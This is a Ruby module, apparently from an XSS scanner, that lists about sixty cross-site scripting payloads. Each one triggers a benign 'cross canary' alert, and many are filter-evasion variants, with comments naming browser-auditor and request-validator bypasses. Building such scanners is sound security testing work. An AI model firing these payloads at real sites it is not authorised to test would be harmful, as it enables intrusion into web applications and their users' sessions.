module Cross
  module Attack
    class XSS

      def self.each

        evasions = [
          "<script>alert('cross canary')</script>",
          "<script>alert('cross canary');</script>",
          "/--><script>alert('cross canary')</script>",
          "/--><script>alert('cross canary');</script>",
          "/--></ScRiPt><ScRiPt>alert('cross canary')</ScRiPt>",
          "/--></ScRiPt><ScRiPt>alert('cross canary');</ScRiPt>",
          "//;-->alert('cross canary')",
          "//;-->alert('cross canary');",
          "\"//;\nalert('cross canary')",
          "\"//;\nalert('cross canary');",
          # more exotic vectors (antisnatchor's collection)
          "<script/anyjunk>alert('cross canary')</script>",
          "<<script>alert('cross canary');//<</script>",
          "<img onerror=alert('cross canary') src=a>",
          "<xml onreadystatechange=alert('cross canary')>",
          "<style onreadystatechange=alert('cross canary')>",
          "<iframe onreadystatechange=alert('cross canary')>",
          "<object onerror=alert('cross canary')>",
          "<object type=image src=/images/live.gif onreadystatechange=alert('cross canary')></object>",
          "<img type=image src=/images/live.gif onreadystatechange=alert('cross canary')>",
          "<input type=image src=/images/live.gif onreadystatechange=alert('cross canary')>",
          "<isindex type=image src=/images/live.gif onreadystatechange=alert('cross canary')>",
          "<script onreadystatechange=alert('cross canary')>",
          "<bgsound onpropertychange=alert('cross canary')>",
          "<body onbeforeactivate=alert('cross canary')>",
          "<body onfocusin=alert('cross canary')>",
          "<input autofocus onfocus=alert('cross canary')>",
          "<input onblur=alert('cross canary') autofocus><input autofocus>",
          "<body onscroll=alert('cross canary')><br><br>...<br><input autofocus>",
          "</a onmousemove=alert('cross canary')>",
          "<video src=1 onerror=alert('cross canary')>",
          "<audio src=1 onerror=alert('cross canary')>",
          "<object data=javascript:alert('cross canary')>",
          "<iframe src=javascript:alert('cross canary')>",
          "<embed src=javascript:alert('cross canary')>",
          "<form id=test /><button form=test formaction=javascript:alert('cross canary')>",
          "<event-source src=javascript:alert('cross canary')>",
          "<x style=behavior:url(#default#time2) onbegin=alert('cross canary')>",
          "<x style=x:expression(alert('cross canary'))>",
          "<x onclick=alert('cross canary') src=a>Click here</x>",
          "<img onerror=\"alert('cross canary')\"src=a>",
          "<img onerror=`alert('cross canary')`src=a>",
          "<img/onerror=\"alert('cross canary')\"src=a>",
          "<img onerror=a&#x6c;ert('cross canary') src=a>",
          "<img onerror=a&#x06c;ert('cross canary') src=a>",
          "<img onerror=a&#x006c;ert('cross canary') src=a>",
          "<img onerror=a&#x0006c;ert('cross canary') src=a>",
          "<img onerror=a&#108;ert('cross canary') src=a>",
          "<img onerror=a&#0108;ert('cross canary') src=a>",
          "<img onerror=a&#0108;ert('cross canary') src=a>",
          "<img onerror=a&#108ert('cross canary') src=a>",
          "<img onerror=a&#0108ert('cross canary') src=a>",
          "<script>function::['alert']('cross canary')</script>",
          "<svg><script>//&#x0A;alert('cross canary')</script>", #Chrome <= 18 XssAuditor bypass
          "<script>/*///*/alert('cross canary');</script>", #Chrome <= 20 XssAuditor bypass
          "<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('cross canary'))>", #.NET RequestValidator bypass
          "+ADw-script+AD4-alert('cross canary')+ADw-/script+AD4-", # UTF-7
          "},alert('cross canary'),function x(){//", # DOM breaker
          "\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3ealert('cross canary')\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e" #DOM-based innerHTML injection
        ]
        evasions.each do |pattern|
          yield pattern if block_given?
        end
      
      end

    end
  end
end
